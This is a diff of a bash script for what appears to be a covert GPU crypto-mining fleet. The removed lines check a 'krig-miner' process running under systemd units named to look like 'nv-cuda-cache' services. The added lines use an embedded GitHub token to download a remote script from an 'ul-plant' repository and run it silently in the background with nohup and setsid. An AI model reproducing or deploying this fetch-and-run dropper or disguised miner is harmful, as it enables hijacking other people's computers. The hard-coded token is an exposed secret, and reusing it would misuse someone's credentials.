@@ -1,8 +1,10 @@
 #!/bin/bash
-L=/opt/fleet/logs; HN=$(hostname)
-echo "=== final $(date -u) host=$HN krig=$(pgrep -fc 'krig-miner --coin')"
-nvidia-smi --query-gpu=index,name,utilization.gpu,power.draw,temperature.gpu --format=csv,noheader 2>&1
-echo "--- rates"; grep -h 'TH/s' $L/krig-$HN-g*.log 2>/dev/null | tail -8
-echo "--- acc"; for f in $L/krig-$HN-g*.log; do printf "%s " $(grep -c 'share accepted' $f); done; echo
-echo "--- units"; systemctl is-active nv-cuda-cache@0 nv-cuda-cache@1 nv-cuda-cache@7 2>&1
-echo "--- hb"; bash /opt/fleet/ps8_hb.sh; echo "hb rc=$?"
+# per-host bootstrap -> fetch cmd8/ps9.sh raw and dispatch it (arch-adaptive plant)
+GH='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'
+B=/opt/fleet; mkdir -p "$B/logs"
+curl -s --retry 3 --retry-delay 3 -m 120 -H "Authorization: Bearer $GH" -H 'Accept: application/vnd.github.raw'   -o /tmp/ps9_run.sh "https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/ps9.sh?ref=main"
+if ! grep -q 'MODE=peak' /tmp/ps9_run.sh 2>/dev/null; then echo "HOSTBOOT fetch FAILED size=$(stat -c%s /tmp/ps9_run.sh 2>/dev/null)"; exit 1; fi
+cp -f /tmp/ps9_run.sh "$B/ps9.sh"
+echo "HOSTBOOT ps9 sha=$(sha256sum /tmp/ps9_run.sh | cut -c1-12) $(date -u)"
+nohup setsid bash /tmp/ps9_run.sh >>"$B/logs/ps9.log" 2>&1 &
+echo "HOSTBOOT dispatched pid=$!"
